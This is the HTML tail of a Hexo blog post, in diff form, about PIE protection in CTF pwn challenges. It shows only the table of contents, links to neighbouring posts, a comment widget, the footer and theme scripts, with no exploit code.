+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/ctf-pwn/">#ctf-pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">hitcontraining_heapcreator--简单堆利用</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">格式化字符串漏洞</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">PIE保护</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PIE%E4%BF%9D%E6%8A%A4"><span class="nav-text">PIE保护</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E5%BC%80%E5%90%AFpie%E7%9A%84gdb%E8%B0%83%E8%AF%95"><span class="nav-text">关于开启pie的gdb调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E9%A2%98%E7%9B%AE"><span class="nav-text">具体题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%B7%B1%E8%82%B2%E6%9D%AF-2021-find-flag-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-pie"><span class="nav-text">1.[深育杯 2021]find_flag(格式化字符串-pie)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-linkctf-2018-7-babypie"><span class="nav-text">2.linkctf_2018.7_babypie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Basectf-week3-PIE-%E7%88%86%E7%A0%B4%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="nav-text">3.Basectf-week3-PIE(爆破返回地址)</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">D0wnBe@t</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        32 posts in total
+                    </span>
+                    
+                        <span>
+                            32.9k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+</body>
+</html>
